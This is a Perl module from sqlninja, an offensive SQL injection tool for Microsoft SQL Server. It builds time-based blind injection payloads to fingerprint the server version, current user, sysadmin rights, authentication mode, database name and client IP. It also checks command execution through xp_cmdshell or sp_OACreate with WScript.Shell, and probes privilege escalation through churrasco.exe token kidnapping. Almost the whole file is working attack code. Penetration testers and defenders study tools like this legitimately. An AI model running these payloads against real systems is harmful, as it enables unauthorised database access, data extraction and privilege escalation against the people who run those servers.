# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Ask the user what he/she wants to fingerprint, then call the
# appropriate function
sub fingerprint
{

	print_verbose("Setting up extraction module...\n");
	setup_module();

	# some configuration depending menu entries
	my $opt_xp = "openrowset+sp_oacreate";
	if ($conf->{'xp_name'} ne "NULL") {
		$opt_xp = $conf->{'xp_name'};
	}

	my $opt_working = "Whether SQL Server runs as System ($opt_xp must be available)";
	if ($conf->{'churrasco'} == 1) {
		$opt_working = "Whether churrasco.exe can steal System's token\n".
			"      (Win2k3 only. ".$opt_xp." must be available and\n".
			"      churrasco.exe must have been uploaded)";
	}

 	my @m = (
		[	'0',	'Database version (2000/2005/2008/2012)', 						\&fingerprint_version	],
		[	'1',	'Database user',											\&fingerprint_user		],
		[	'2',	'Database user rights',										\&fingerprint_sysadmin	],
		[	'3',	"Whether $opt_xp is working",								\&fingerprint_shell	],
		[	'4',	'Whether mixed or Windows-only authentication is used',		\&fingerprint_auth	],
		[	'5',	$opt_working,												\&fingerprint_sqlsrvuser	],
		[	'6',	"Current database name",									\&fingerprint_dbname	],
		[	'7',	"Client IP address\n",									\&fingerprint_client_net	],

		[	'a',	'All of the above',											\&fingerprint_all ],
		[	'h',	'Print this menu',											undef	],
		[	'q',	'quit',														\&fingerprint_quit	]
 	);

	show_menu(\@m, "\nWhat do you want to discover?");
}

sub fingerprint_quit
{
	shutdown_module();
	exit(0);
}

sub fingerprint_all
{
	#fingerprint version
	fingerprint_version();

	# fingerprint current user
	fingerprint_user();

	# fingerprint user privileges
	fingerprint_sysadmin();

	# check if xp_cmdshell/openrowset are working
	fingerprint_shell();

	# fingerprint authentication mechanism
	fingerprint_auth();

	# fingerprint server privileges
	fingerprint_sqlsrvuser();

	# fingerprint current database name
	fingerprint_dbname();
}

# Using inference-based SQL Injection, figures out whether we are talking to a 
# SQL Server 2000 or 2005. The double-negation logic is used to avoid the 
# injection of the '=' sign, that was filtered by a couple of applications that
# I tested (go figure!)
sub fingerprint_version
{
	my $query;
	my $query_len;
	my $delay;


	print "[+] Checking SQL Server version...\n";
	
	my ($version, $updated) = session_load_property(SESSION_PROPERTY_DBMS_VERSION);

	if ($version ne "") {
		print "    Version: $version\n";

		# refresh information if required
		#if (refresh_data($updated, "SELECT 1 WHERE substring((select \@\@version),25,1) = " . substr($version, 24, 1)) == 0) {
		#	session_store_property_unique(SESSION_PROPERTY_DBMS_VERSION, $version);
		#	return;
		#}
		return $version;
	}

	$version = "unknown";

	if ($conf->{'extractionchannel'} eq "dns") {
		$query = "select \@\@version";
		$query_len = "select len(\@\@version)";
		$version = extract_string($query, $query_len, 1, 200, 0, "");
		session_store_property_unique(SESSION_PROPERTY_DBMS_VERSION, $version);
		print "    Version: $version\n";
		return $version;
	}

	$query = "if not(substring((select \@\@version),25,1) <> 5) waitfor ".
		    		"delay '0:0:".$conf->{'blindtime'}."';";
	$delay = tryblind($query);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		$version = "Microsoft SQL Server 2005";

	} else {	
		$query = "if not(substring((select \@\@version),25,1) <> 0) waitfor ".
			    	"delay '0:0:".$conf->{'blindtime'}."';";
		$delay = tryblind($query);
		if ($delay > ($conf->{'blindtime'} - 2)) {
			$version = "Microsoft SQL Server 2000";

		} else {
			$query = "if not(substring((select \@\@version),25,1) <> 8) waitfor ".
				   		"delay '0:0:".$conf->{'blindtime'}."';";
			$delay = tryblind($query);
			if ($delay > ($conf->{'blindtime'} - 2)) {
				$version =  "Microsoft SQL Server 2008";
			} else {
				$query = "if not(substring((select \@\@version),25,1) <> 2) waitfor ".
				   		"delay '0:0:".$conf->{'blindtime'}."';";
				$delay = tryblind($query);
				if ($delay > ($conf->{'blindtime'} - 2)) {
					$version =  "Microsoft SQL Server 2012";
				}
			} 
		}
	}

	if (!sanity_check("SELECT 1 WHERE substring((select \@\@version),25,1) = " . substr($version, 24, 1))) {
	    print "The result was corrupted. Trying again...\n";
		return fingerprint_version();
	}

	session_store_property_unique(SESSION_PROPERTY_DBMS_VERSION, $version);

	print "    Version: $version\n";
	return $version;
}

# Using inference-based SQL Injection, figures out which
# user is performing the queries on the target DB
sub fingerprint_user
{
	my $query;
	my $delay;

	print "[+] Enumerating current user...\n";

	my ($usr, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_USER);

	if ($usr ne "") {
		print "    Current user: $usr\n";
		
		# refresh information if required
		#if (refresh_data($updated, "SELECT 1 WHERE system_user = '$usr'") == 0) {
		#	session_store_property_unique(SESSION_PROPERTY_CURRENT_USER, $usr);
		#	return;
		#}
	}

	print "[+] Checking whether we are sysadmin...\n";

	$query = "if not(select system_user) <> 'sa' waitfor delay '0:0:".$conf->{'blindtime'}."'";
	$delay = tryblind($query);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		print "    We seem to be 'sa' :)\n";
		$usr = 'sa';
		session_store_property_unique(SESSION_PROPERTY_CURRENT_USER_IS_ADMIN,1);
	} else {
		print "    No, we are not 'sa'.... :/ \n";

		$usr = extract_string("select system_user", "select len(system_user)", 1, 30, 0, "DB User");

		if (!sanity_check("SELECT 1 WHERE system_user = '$usr'")) {
	    	print "The result was corrupted. Trying again...\n";
			return fingerprint_user();
		}
	}
	session_store_property_unique(SESSION_PROPERTY_CURRENT_USER, $usr);
	session_store_property(SESSION_PROPERTY_USER, $usr);

	print "    Current user: $usr\n";
}

# Check whether we are part of the sysadmin group...
# Mostly useful after having used the escalation method
sub fingerprint_sysadmin
{

	print "[+] Checking whether user is member of sysadmin server role....\n";

	# don't load from session. Easier to just re-enumerate every time
	# my ($is_admin, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_USER_IS_ADMIN);
	my $is_admin = 0;

	my $query = "if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:".$conf->{'blindtime'}."';";
	
	my $delay = tryblind($query);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		$is_admin = '1';
	} else {
		$is_admin = '0';
	}
	
	# but store it anyway
	session_store_property_unique(SESSION_PROPERTY_CURRENT_USER_IS_ADMIN, $is_admin);

	if ($is_admin eq "1") {
		print "    You are an administrator!\n";
	} else {
		print "    You are not an administrator.\n".
			  "    If you tried escalating already, it might be\n".
			  "    that you are using old ODBC connections.\n".
			  "    Check the documentation for how to deal with this.\n";
	}
}

# Try to see if the stored procedure passed as a parameter
# is working
sub fingerprint_shell
{

	my $opt_xp = "openrowset+sp_oacreate";
	if ($conf->{'xp_name'} ne "NULL") {
		$opt_xp = $conf->{'xp_name'};
	}

	print "[+] Checking whether $opt_xp is working....\n";
	
	my $is_working = 0;
	if ($conf->{'xp_name'} eq "NULL") {
		$is_working = fingerprint_nullshell();
	} else {
		my $query = "exec master..". $conf->{'xp_name'} ." 'ping -n ".$conf->{'blindtime'} ." 127.0.0.1';";
		my $delay = tryblind($query);
		if ($delay > ($conf->{'blindtime'} - 2)) {
			$is_working = 1;
		}
	}

	if ($is_working == 1) {
		print "    $opt_xp is working!\n";
	} else {
		print "    $opt_xp is not working.\n";

	}
}

sub fingerprint_nullshell
{

	if ($conf->{'password'} eq "") {
		print "[-] Specify 'sa' password to use \"NULL\" xp_cmdshell\n".
		      "    If you are 'sa' already, you shouldn't need NULL ".
		      "xp_cmdshell anyway.... \n";
		exit(0);
	}

	my $query = "DECLARE \@ID int ".
		        "EXEC sp_OACreate 'WScript.Shell',\@ID OUT ".
				"EXEC sp_OAMethod \@ID,'Run',Null,'ping -n ".$conf->{'blindtime'}." 127.0.0.1',0,1 ".
				"EXEC sp_OADestroy \@ID";
	my $delay = tryblind($query);
	if ($delay > $conf->{'blindtime'} - 2) {
		return 1;
	}

	return 0;
}


# Figures out which authentication system is in place
sub fingerprint_auth
{

	print "[+] Checking the authentication mechanism....\n";

	my ($auth, $updated) = session_load_property(SESSION_PROPERTY_AUTH_MECHANISM);

	#if ($auth ne "") {
	#	if (refresh_data($updated, "") == 0) {
	#		session_store_property_unique(SESSION_PROPERTY_AUTH_MECHANISM, $auth);
	#		return;
	#	}
	#}

	if ($auth eq "") {
		$auth = 'unknown';

		my $query="if not((select serverproperty('IsIntegratedSecurityOnly')) ".
						" <> 1) waitfor delay '0:0:".$conf->{'blindtime'}."';";
		my $delay = tryblind($query);
		if ($delay > ($conf->{'blindtime'} - 2)) {
			$auth = 'windows-only';
		} else {
			$query="if not((select serverproperty('IsIntegratedSecurityOnly')) ".
					" <> 0) waitfor delay '0:0:".$conf->{'blindtime'}."';";
			$delay = tryblind($query);
			if ($delay > ($conf->{'blindtime'} - 2)) {
				$auth = 'mixed';
			}
		}

		session_store_property_unique(SESSION_PROPERTY_AUTH_MECHANISM, $auth);
	}

	print "    Authentication mechanim: $auth\n";
}


sub fingerprint_sqlsrvuser
{

	my $cmd = "whoami";

	if ($conf->{'churrasco'} == 1) {
		$cmd = usechurrasco($cmd);
		print "[+] Checking whether Churrasco.exe can escalate privileges...\n";
	} else {
		print "[+] Checking whether SQL Server runs as NT Authority\\SYSTEM...\n";
	}
	
	if ($conf->{'xp_name'} eq "NULL") {
		print "[-] This mode does not currently work with inline procedure injection\n";
		return;
	}
	
	my $rnd = int(rand()*65535);
	
	my $query = "drop table tempdb..blah".$rnd.";".
			    "create table tempdb..blah".$rnd." (name nvarchar(100));".
		    	"insert tempdb..blah".$rnd." exec master..".$conf->{'xp_name'}." '".$cmd."';".
		    	"if (select top 1 name from tempdb..blah".$rnd.") ".
		       		"like 'nt authority\\system' ".
		      	 "waitfor delay '0:0:".$conf->{'blindtime'}."';".
		    	"drop table tempdb..blah".$rnd.";";

	my $delay = tryblind($query);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		if ($conf->{'churrasco'} == 1) {
			print "    Churrasco appears to make our queries run as System... yay!\n";
		} else {
			print "    SQL Server appears to be running as System.... yay!\n";
		}
	} else {
		if ($conf->{'churrasco'} == 0) {
			print "    SQL Server does not appear to be running as System. You can try\n".
				  "    uploading and using churrasco.exe to attempt token kidnapping\n";
		} else {
				print "    Queries do not appear to be run as System. The box might have\n  been patched\n";
		}
	}
}


sub fingerprint_dbname
{
	print "[+] Enumerating current database name...\n";

	my ($dbname, $updated) = session_load_property(SESSION_PROPERTY_CURRENT_DATABASE);

	if ($dbname ne "") {
		print "    Current database name: $dbname\n";
		#if (refresh_data($updated, "SELECT 1 WHERE db_name() = '$dbname'") == 0) {
		#	session_store_property_unique(SESSION_PROPERTY_CURRENT_DATABASE, $dbname);
		#	return;
		#}
	}

	$dbname = extract_string("select db_name()", "select len(db_name())", 1, 30, 0, "Database Name");
	
	if (!sanity_check("SELECT 1 WHERE db_name() = '$dbname'")) {
	   	print "The result was corrupted. Trying again...\n";
		return fingerprint_dbname();
	}

	session_store_property(SESSION_PROPERTY_CURRENT_DATABASE, $dbname); 
	session_store_database($dbname);

	print "    Current database name: $dbname\n";
}

sub fingerprint_client_net
{
	print "[+] Enumerating client IP address...\n";

	my ($version, $updated) = session_load_property(SESSION_PROPERTY_DBMS_VERSION);
	if ($version eq "") {
		print "In order to extract the client IP addresses, we need to know the DB version\n";
		$version = fingerprint_version();
	}
	if ($version =~ /Microsoft SQL Server 2000/ or
		$version =~ /Microsoft SQL Server 2005/) {
		print "Sorry, this functionality only works with SQL Server > 2005.\n";
		#TODO: implement for other versions
		return;
	} 

	my ($ip_addr, $updated) = session_load_property(SESSION_PROPERTY_CLIENT_IP_ADDR);

	if ($ip_addr ne "") {
		print "    Client IP address: $ip_addr\n";
		return;
	}

	for (my $segment = 1; $segment <= 4; $segment++) {
		my $rs = extract_number("SELECT PARSENAME(CAST(CONNECTIONPROPERTY('client_net_address') as varchar(60)), $segment)", 0, 256, 1, "Client IP address");
		if ($ip_addr ne "") {
			$ip_addr = $rs . "." . $ip_addr;
		} else {
			$ip_addr = $rs;
		}
	}

	if (!sanity_check("SELECT 1 WHERE CAST(CONNECTIONPROPERTY('client_net_address') as varchar(60))='$ip_addr'")) {
	   	print "The result was corrupted. Trying again...\n";
		return fingerprint_client_net();
	}

	session_store_property_unique(SESSION_PROPERTY_CLIENT_IP_ADDR, $ip_addr); 

	print "    Client IP address: $ip_addr\n";

}

1;